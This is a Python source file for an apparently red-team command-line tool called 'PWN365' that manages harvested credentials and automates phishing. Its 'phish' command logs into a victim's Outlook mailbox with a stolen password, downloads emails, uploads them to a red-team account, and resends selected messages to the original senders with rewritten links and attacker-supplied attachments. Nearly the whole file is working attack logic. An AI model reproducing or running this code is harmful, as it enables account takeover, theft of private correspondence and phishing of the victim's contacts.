from Outlook import Session
from DataStorage import CredentialList

class Command:
    """Command object that does command stuff.

    """
# Not implimented yet.
    history = []

    leet_sauce = """

=============================================================================
         |   \          /  /       \   |           |      |          ____|
     __| |    \  /  \  /  /     |\  \  |    ____   |      |_   |     |
     ____|     \/ /  \/  /      | \    |    ____   |      | |  |      __ |
   _|          __/   ___/     __|  \___|    _______|    _______|   ______|
=============================================================================


    """

    _help_commands = {
        'help'   : 'Lists potential commands                       Syntax: help',
        'clear'  : 'Clears the current CLI                         Syntax: clear',
        'exit'   : 'Exit the program.                              Syntax: exit',
        'show'   : 'Shows all of the data collected                Syntax: show -d <data_type>',
        'export' : 'Exports selected data.                         Syntax: export -d <data_type> -f <file_path> ',
        'import' : 'Imports data from selected file.               Syntax: import -f <file_path>',
        'add'    : 'Adds a credential.                             Syntax: add -u <username> -p <password> -d <domain>',
        'phish'  : 'Sends phishing emails from a specified user.   Syntax: phish -u <username>'
        }

    def __init__(self, command_str, cred_list, args):
        """Initializes a Command instance.

        :param command_str: (String)       The command that this instance will represent
        :param args:        (Dict{String}) Dictionary of flags and values to execute the command with
        """

        self.command = command_str
        self.cred_list = cred_list
        self.args = args

    def cmd_help(self):
        """List out all of the possible commands

        """

        print(' ')
        print('{0:25}  :  {1:100}'.format("Command", "Description"))
        print('-'*125)
        for item in self._help_commands:
            print('{0:15}  :  {1:100}'.format(item, self._help_commands[item]))
        print(' ')

    def cmd_show(self):
        """Show all of the data contained that is a specific data type.

        """
        try:
            data_type = self.args['-d']
        except IndexError:
            print("Cannot be displayed because '-d' flag was not passed!")
            print("Syntax for 'show' is: show -d <datatype>")

        if data_type == 'credentials' or data_type == 'creds':
            self.cred_list.display_all()
        elif data_type == 'redteam':
            pass
        else:
            print("That data type is not supported. Please try again or 'help' for more information.")

    def cmd_export(self):
        """Exports data to a file that can be parsed
        """

        try:
            data_type = self.args['-d']
            file_path = self.args['-f']

# This exception should be something more along the lines of a key error...
        except IndexError:
            print("Cannot be displayed because INVALID NUMBER OF ARGUMENTS.!")
            print("Syntax for 'export' is: export <datatype> <filename>")

        if(data_type == "credentials"):
            self.cred_list.export_file(file_path)
        elif(data_type == "users"):
            print("Not implimented yet.")
        elif(data_type == "addump"):
            print("Not implimented yet.")
        elif(data_type == "passlist"):
            print("Not implimented yet.")
        elif(data_type == "domain"):
            print("Not implimented yet.")
        else:
            print("That is an invalid command, please try again or 'help' for more information.")

    def cmd_import(self):
        """Import data from a specified file.
        """

        # Check to make sure the command has at least 2 arguments.
        try:
            file_path = self.args['-f']

# This Error needs to be updated to something involving a keyerror
        except IndexError:
            print(file_path + " was NOT succesfully imported due to INVALID NUMBER OF ARGUMENTS.!")
            print("Syntax for 'import' is: import <filename>")

        try:
            self.cred_list.import_file(file_path)
            print(file_path + " was succesfully imported!")
        except IOError:
           print(file_path + " was NOT succesfully imported because that FILE DOES NOT EXIST")

    def cmd_exit(self, file_path='archives.txt'):
        """Ask to save existing data, then exit.

        """
        while True:
            saveState = raw_input("Would you like to save the data that you have collected? (y/n): ")
            if(saveState == 'y'):
# This has a hard value for testing purposes, should be changed before final version.
                self.cred_list.export_file(file_path)
                exit()
            elif(saveState == 'n'):
                print("Data not saved.")
                exit()
            else:
                print("Invalid option entered, please enter either 'y' or 'n'. ")

    def cmd_add(self):
        """Add specified data to the credential list.
        """

        try:
            username = self.args['-u']
        except KeyError:
            print("You didn't include an username.")
            username = raw_input("What username would you like to add? (Only before the @ symbol): ")

        try:
            password = self.args['-p']
        except KeyError:
            print("You didn't include an password.")
            username = raw_input("What password would you like to add? (Leave empty for no pass): ")

        try:
            domain = self.args['-d']
        except KeyError:
            print("You didn't include an domain.")
            domain = raw_input("What domain would you like to add? (ie google.com): ")

        self.cred_list.add_cred(str(username), str(password), str(domain), False, False, '')

# (Probably Error filled...)
    def cmd_phish(self):
        """Phishes selected user from credential list. Will exit if there isn't a valid user, pass, or domain.
        """

        # Ensure that there is a valid user whose email you can access.
        try:
            vic_username = self.args['-u']
        except KeyError:
            print("You didn't include an username.")
            vic_username = raw_input("What username would you like to add? (Only before the @ symbol): ")



        # Validate that there is a password saved.
        try:
            vic_password = self.cred_list.get_password(vic_username)
        except KeyError:
            print("That user isn't in your saved credentials, try another.")
            print("'show -d credentials' will show you what users you can use. ")
            return

        if vic_password == '':
            print("That user doesn't have a password in your saved credentials, try another.")
            print("It needs to have a username, domain, and password.")
            print("'show -d credentials' will show you the credentials. ")
            return

        # Validate that there is a domain saved.

        try:
            vic_domain = self.cred_list.get_domain(vic_username)
        except KeyError:
            print("That user isn't in your saved credentials, try another.")
            print("'show -d credentials' will show you what users you can use. ")
            return

        if vic_domain == '':
            print("That user doesn't have a password in your saved credentials, try another.")
            print("It needs to have a username, domain, and password.")
            print("'show -d credentials' will show you the credentials. ")
            return

        hack = Session(vic_domain, vic_username, password=vic_password)

        # Determine how user wants to pull emails.
        num = 10
        search_term = ''
        while(True):
            user_input = raw_input("Do you want to pull recent email, or by keyword? (r/k) ")
            if user_input == 'r':
                try:
                    num = int(raw_input("How many do you want?(an integer please!)"))
                    break
                except ValueError:
                    print("That wasn't an int, try again...")

            elif user_input == 'k':
                search_term = raw_input("What would you like to search for? ")
                break

         # Download emails from victim, and then upload to the red_team account
        hack.vic_download_emails(number=num, keyword=search_term)
        hack.red_upload_emails()

        # Hold while the user sorts out what emails they want to return as phishing emails.
        print('Emails have been uploaded to the folder: ' + hack.full_username + '/inbox/')
        print('Any Emails that you would like to return back to the original senders as phsihing emails,')
        print('Move to the: ' + hack.full_username + '/to_send/ folder and then type "continue" here. \n')
        temp = ''
        while not temp == 'continue':
            temp = raw_input("Enter 'continue' when ready: ")
            if not temp == 'continue':
                print('That was incorrect input, try again.')
            else:
                break

        # Get ready to send
        print('A few more options before we send them. ')
        target_link = ''

        # Determine options
        while(True):
            replace_links = raw_input('Would you like to rewrite links? (y/n): ').lower()

            if replace_links == 'y':
                replace_links = True
                target_link = raw_input('What link would you like to replace them with?: ')
                break
            elif replace_links == 'n':
                replace_links = False
                break
            else:
                print('That was not an option, try again. ')


        target_file_path = ''
        target_file_name = ''

        while(True):
            file_attach = raw_input('Would you like to attach a file? (y/n): ')

            if file_attach == 'y':
                file_attach      = True
                target_file_path = raw_input('What is the file path of the file you wish to attach? ')
                target_file_name = raw_input('What would you like to name the file? ')
                break
            elif file_attach == 'n':
                file_attach = False
                break
            else:
                print('That was not an option, try again. ')

        # Send away!
        hack.send_phishing_email(link_replace=replace_links, link=target_link, attach_file=file_attach, file_path=target_file_path, file_name=target_file_name)

    def cmd_clear(self):
        """Clear the current console.

        """
        print('\n'*100)
        print self.leet_sauce

    _commands = {
        'help'   : cmd_help,
        'clear'  : cmd_clear,
        'exit'   : cmd_exit,
        'show'   : cmd_show,
        'export' : cmd_export,
        'import' : cmd_import,
        'add'    : cmd_add,
        'phish'  : cmd_phish
        }

# (Should work)
    def execute_command(self):
        """Execute the command
        """
        try:
            self._commands[self.command](self)
        except KeyError:
            print('The command you entered is incorrect, or you passed invalid arguments for the command: ' + self.command)

        print('\n\n')

    @classmethod
    def parse_args(cls, command_str):
        """Parse the command string recieved from the user and return a dictionary of arguments and values.

        :param command_str: (String)       The string containing the user's command input

        :return:            (Dict{String}) A Dictionary of flags and values to be run against the specified command

                    NOTE: The structure of the rest looks like {'-f':'flag value'}
        """
        cmd_list = command_str.split(' ')

        command = cmd_list[0]
        args = {}

        # We don't need to include [0] because it's gonna be the main command 100% of the time.
        for i in range(1,len(cmd_list)):
            # If the list item has a '-', then it's a flag so it will be the key in the dictionary
            if cmd_list[i][0] == '-':
                args[cmd_list[i]] = cmd_list[i+1]

        return command, args

    @classmethod
    def get_command(cls, cred_list):
        """Gets the command from the user.

        :return: (Command) A command instance that can be executed or whatnot
        """

        while(True):
            usr_cmd = raw_input("PWN365->")

            command, args = cls.parse_args(usr_cmd)

            if(command not in Command._help_commands.keys()):
                print("Command not supported. Please try again. ")
            else:
                return Command(command, cred_list, args)
